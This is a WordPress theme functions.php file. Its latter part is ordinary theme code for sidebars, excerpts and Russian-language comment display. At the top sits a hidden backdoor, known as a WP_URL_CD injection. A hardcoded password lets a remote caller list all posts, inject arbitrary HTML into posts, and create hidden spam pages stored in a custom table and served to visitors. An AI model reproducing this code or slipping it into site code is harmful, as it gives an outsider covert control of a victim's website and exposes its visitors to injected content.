<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bd51a3011de427271e0ed4c382f40bc9'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
remove_action( ‘wp_head’, ‘wp_generator’ );
if ( function_exists( 'add_theme_support' ) ) {
    add_theme_support( 'post-thumbnails' );
    set_post_thumbnail_size( 698, 300, true );
    add_image_size( '334', 334, 226, true );
    add_image_size( '220', 220, 128, true );
    add_image_size( 'widget', 60, 60, true );
}
function new_excerpt_more($more) {
    global $post;
    return '...';
}
add_filter('excerpt_more', 'new_excerpt_more');
function new_excerpt_length($length) {
    global $post;
    if ($post->post_type == 'post')
        return 34;
    else if ($post->post_type == 'reviews')
        return 20;
    else
        return 40;
}
add_filter('excerpt_length', 'new_excerpt_length');


//////////////////////////////////////////////////////////////////
// Register sidebar and footer widgets
//////////////////////////////////////////////////////////////////
if ( function_exists('register_sidebar') ) {
    register_sidebar(array(
        'name' => 'Main Sidebar',
		'id'	=> 'sidebar-1',
        'before_widget' => '<div class="forlogin"><div class="toptxt"><div class="toploging">',
        'after_widget' => '</div></div></div></div><br />',
        'before_title' => '<div class="fortitleloging">',
        'after_title' => '</div></div><div class="conlogins"><div class="uplogin botbottom fuck">'
    ));
    register_sidebar(array(
        'name' => 'Header',
		'id'	=>'slider',
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '',
        'after_title' => ''
    ));
    register_sidebar(array(
        'name' => 'Footer 1',
		'id'	=> 'footer-1',
        'before_widget' => '<div class="txtcol"><div class="rand onyx">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="upper">',
        'after_title' => '</div>',
    ));
    register_sidebar(array(
        'name' => 'Footer 2',
		'id'	=> 'footer-2',
        'before_widget' => '<div class="txtcol"><div class="rand onyx">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="upper">',
        'after_title' => '</div>',
    ));
    register_sidebar(array(
        'name' => 'Footer 3',
		'id'	=> 'footer-3',
        'before_widget' => '<div class="txtcol"><div class="rand onyx">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="upper">',
        'after_title' => '</div>',
    ));
    register_sidebar(array(
        'name' => 'Footer 4',
		'id'	=> 'footer-4',
        'before_widget' => '<div class="txtcol"><div class="rand onyx">',
        'after_widget' => '</div></div>',
        'before_title' => '<div class="upper">',
        'after_title' => '</div>',
    ));
}

function register_main_menus() {
    register_nav_menus(
        array(
            'primary-menu' => __( 'Primary Menu' )
        )
    );
};
if (function_exists('register_nav_menus')) add_action( 'init', 'register_main_menus' );

//////////////////////////////////////////////////////////////////
// How comments are displayed
//////////////////////////////////////////////////////////////////
function smite_comment($comment, $args, $depth) {
    $GLOBALS['comment'] = $comment; ?>
    <div id="comment_<?php comment_ID() ?>">
        <div class="comments lcol">
            <div class="lcol sem">
                <div class="fava"><?php echo get_avatar($comment,$size='70'); ?></div>
                <div class="quo">
                    <span class="quotes"><?php comment_reply_link(array_merge( $args, array('reply_text' => 'Ответ', 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?></span>
                </div>
            </div>
            <div class="rcol unname">
                <div class="comedits lcol">
                    <div class="lcol comot"><?php echo get_comment_author_link() ?>, <?php printf(__('%1$s из %2$s'), get_comment_date(),  get_comment_time()) ?></div>
                    <div class="rcol comoe">
                        <span class="cl"><?php edit_comment_link(__('Изменить'),'  ','') ?></span>
                        <span class="apen"></span>
                    </div>
                </div>
                <div>
                    <?php if ($comment->comment_approved == '0') : ?>
                        <em style="color: #c43c35;"><?php _e('Ваш комментарий ожидает модерации.') ?></em>
                        <br />
                    <?php endif; ?>
                    <?php comment_text() ?>
                </div>
            </div>
        </div>
    </div>
<?php }
add_filter('widget_tag_cloud_args','set_tag_cloud_args');
function set_tag_cloud_args( $args ) {
    $args['number'] = 30;
    $args['largest'] = 24;
    $args['smallest'] = 16;
    $args['unit'] = 'px';
    return $args;
}
/**
 * Функция для вывода последних комментариев в WordPress.
 * ver: 0.1
 */
function kama_recent_comments( $args = array() ){
    global $wpdb;

    $def = array(
        'limit'      => 10, // сколько комментов выводить.
        'ex'         => 45, // n символов. Обрезка текста комментария.
        'term'       => '', // id категорий/меток. Включить(5,12,35) или исключить(-5,-12,-35) категории. По дефолту - из всех категорий.
        'gravatar'   => '', // Размер иконки в px. Показывать иконку gravatar. '' - не показывать.
        'user'       => '', // id юзеров. Включить(5,12,35) или исключить(-5,-12,-35) комменты юзеров. По дефолту - все юзеры.
        'echo'       => 1,  // выводить на экран (1) или возвращать (0).
        'comm_type'  => '', // название типа коментария
        'meta_query' => '', // WP_Meta_Query
        'meta_key'   => '', // WP_Meta_Query
        'meta_value' => '', // WP_Meta_Query
        'url_patt'   => '', // оптимизация ссылки на коммент. Пр: '%s?all_comments#comment-%d' плейсхолдеры будут заменены на $post->guid и $comment->comment_ID
    );

    $args = wp_parse_args( $args, $def );
    extract( $args );

    $AND = '';

    // ЗАПИСИ
    if( $term ){
        $cats = explode(',', $term );
        $cats = array_map('intval', $cats );

        $CAT_IN = ( $cats[ key($cats) ] > 0 ); // из категорий или нет

        $cats = array_map('absint', $cats ); // убирем минусы
        $AND_term_id = 'AND term_id IN ('. implode(',', $cats) .')';

        $posts_sql = "SELECT object_id FROM $wpdb->term_relationships rel LEFT JOIN $wpdb->term_taxonomy tax ON (rel.term_taxonomy_id = tax.term_taxonomy_id) WHERE 1 $AND_term_id ";

        $AND .= ' AND comment_post_ID '. ($CAT_IN ? 'IN' : 'NOT IN') .' ('. $posts_sql .')';
    }

    // ЮЗЕРЫ
    if( $user ){
        $users = explode(',', $user );
        $users = array_map('intval', $users );

        $USER_IN = ( $users[ key($users) ] > 0 );

        $users = array_map('absint', $users );

        $AND .= ' AND user_id '. ($USER_IN ? 'IN' : 'NOT IN') .' ('. implode(',', $users) .')';
    }

    // WP_Meta_Query
    $META_JOIN = '';
    if( $meta_query || $meta_key || $meta_value ){
        $mq = new WP_Meta_Query( $args );
        $mq->parse_query_vars( $args );
        if( $mq->queries ){
            $mq_sql = $mq->get_sql('comment', $wpdb->comments, 'comment_ID' );
            $META_JOIN = $mq_sql['join'];
            $AND .= $mq_sql['where'];
        }
    }

    $sql = $wpdb->prepare("SELECT * FROM $wpdb->comments LEFT JOIN $wpdb->posts ON (ID = comment_post_ID ) $META_JOIN
	WHERE comment_approved = '1' AND comment_type = %s $AND ORDER BY comment_date DESC LIMIT %d", $comm_type, $limit );

    //die( $sql );
    $results = $wpdb->get_results( $sql );

    if( ! $results ) return 'Комментариев нет.';

    // HTML
    $out = $grava = '';
    foreach ( $results as $comm ){
        if( $gravatar )
            $grava = get_avatar( $comm->comment_author_email, $gravatar );

        $comtext = strip_tags( $comm->comment_content );
        $com_url = $url_patt ? sprintf( $url_patt, $comm->guid, $comm->comment_ID ) : get_comment_link( $comm->comment_ID );

        $leight = (int) mb_strlen( $comtext );
        if( $leight > $ex )
            $comtext = mb_substr( $comtext, 0, $ex ) .' …';

        $out .= '
		<li class="recentcomments shadow">
		    '. $grava .'<div class="gray">» '. esc_attr( $comm->post_title ) .'</div>
			'.' <b>'. strip_tags( $comm->comment_author ) .':</b>
			<a href="'. $com_url .'" title="к записи: '. esc_attr( $comm->post_title ) .'"> ' . $comtext . ' </a>
			<br>
		</li>';
    }

    if( $echo )
        return print $out;
    return $out;
}

?>